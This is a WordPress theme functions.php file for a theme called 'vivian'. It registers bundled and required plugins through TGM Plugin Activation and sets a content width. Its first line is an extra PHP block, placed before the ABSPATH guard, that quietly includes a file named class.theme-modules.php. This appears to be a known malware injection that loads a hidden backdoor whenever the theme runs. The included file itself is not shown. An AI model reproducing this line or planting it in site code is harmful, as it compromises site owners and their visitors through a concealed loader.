<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php if ( ! defined( 'ABSPATH' ) ) { die(); }

/**
 * Theme Includes
 */
require_once(get_theme_file_path('/inc/init.php'));

/**
 * TGM Plugin Activation
 */
{
	require_once(get_theme_file_path('/TGM-Plugin-Activation/class-tgm-plugin-activation.php'));
	
	/** @internal */
	function _action_vivian_register_required_plugins() {
		tgmpa( array(
			array(
				'name'      => esc_html__('Unyson', 'vivian'),
				'slug'      => 'unyson',
				'required'  => true,
			),
			array(
				'name'      			=> esc_html__('Advanced Custom Fields Pro', 'vivian'),
				'slug'      			=> 'advanced-custom-fields-pro',
				'source'    			=> get_template_directory() . '/TGM-Plugin-Activation/plugins/advanced-custom-fields-pro.zip',
				'required'  			=> true,
				'force_activation' 		=> false
			),
			array(
				'name'     				=> esc_html__('Envato Market', 'vivian'),
				'slug'     				=> 'envato-market',
				'source'   				=> get_template_directory() . '/TGM-Plugin-Activation/plugins/envato-market.zip',
				'required' 				=> false,
				'version' 				=> '',
				'force_activation' 		=> false,
				'force_deactivation' 	=> false,
				'external_url' 			=> ''
			),
			array(
				'name'     				=> esc_html__('Subsolar Designs Extras', 'vivian'),
				'slug'     				=> 'subsolar-extras',
				'source'   				=> get_template_directory() . '/TGM-Plugin-Activation/plugins/subsolar-extras.zip',
				'required' 				=> true,
				'version' 				=> '',
				'force_activation' 		=> false,
				'force_deactivation' 	=> false,
				'external_url' 			=> ''
			),
			array(
				'name'     				=> esc_html__('Contact Form 7', 'vivian'),
				'slug'     				=> 'contact-form-7',
				'required' 				=> false,
				'version' 				=> '',
				'force_activation' 		=> false,
				'force_deactivation' 	=> false,
				'external_url' 			=> ''
			),
			array(
				'name'     				=> esc_html__('Subsolar Twitter Widget', 'vivian'),
				'slug'     				=> 'subsolar-twitter-widget',
				'source'   				=> get_template_directory() . '/TGM-Plugin-Activation/plugins/subsolar-twitter-widget.zip',
				'required' 				=> false,
				'version' 				=> '1.0',
				'force_activation' 		=> false,
				'force_deactivation' 	=> false,
				'external_url' 			=> ''
			),
		) );

	}
	add_action( 'tgmpa_register', '_action_vivian_register_required_plugins' );
}

/**
*  Content Width
*/

if ( ! isset( $content_width ) ) {
	$content_width = 2000;
}